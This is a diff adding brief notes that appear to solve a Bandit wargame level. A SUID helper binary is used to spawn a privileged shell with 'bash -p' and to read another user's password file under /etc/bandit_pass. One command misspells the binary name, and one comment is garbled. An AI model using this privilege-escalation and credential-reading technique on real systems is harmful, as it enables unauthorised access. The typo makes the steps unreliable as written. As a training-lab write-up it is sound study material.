@@ -1,0 +1,11 @@
+# 1: Execute the binary with SUID active
+./bandit27-do
+# 2: Then execute create a protect shell using -p option
+./bandii27-do /bin/bash -p
+# 3: Verify using whoami
+whoami
+# 4: Grab the password of bandit27 user
+cat /etc/bandit_pass/bandit27
+
+# __1: Alternatively you can do this:
+./bandit27-do cat /etc/bandit_pass/bandit27
